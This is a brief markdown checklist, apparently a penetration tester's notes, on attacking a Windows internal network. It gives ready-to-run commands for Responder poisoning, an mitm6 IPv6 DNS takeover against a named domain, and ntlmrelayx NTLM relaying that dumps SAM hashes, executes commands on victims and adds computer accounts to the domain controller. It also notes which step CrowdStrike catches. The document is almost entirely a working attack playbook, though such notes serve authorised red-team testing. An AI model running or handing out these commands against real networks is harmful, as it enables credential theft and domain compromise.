# LAN Attacks & Scanning

## LAN Attacks
 - [ ] Begin running [Responder](https://github.com/SpiderLabs/Responder):
    ```
    apt update && apt install -y responder
    responder -I eth0 -wrf
    ```
 - [ ] Run [mitm6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/):
    ```
    pip install mitm6
    mitm6 -i eth0 -d firenation.com --debug 
    ```
    *Note: Every time I've run this, it has caused network disruptions. Proceed with caution and check out params `-hw` and `-hb`*
    
 - [ ] Relay NTLM authentication from the above poisoning (this specifically is for `mitm6`)
    ```
    ## Should relay to victim via SMB. Needs local admin (I think maybe RID500...need to verify)
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh                   # Attempt to dump SAM 
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -of net-ntlmv2.hsh -c "systeminfo"   # Runs "systeminfo". Caught by CrowdStrike.

    ## LDAPS NTLM relay (patches may fix this!). Any Domain User can add up to 10 computers by default. Compy can be used for BloodHound.
    ntlmrelayx.py --ipv6 -wh wpad.firenation.com -t ldaps://dc.firenation.com --add-computer

    ```
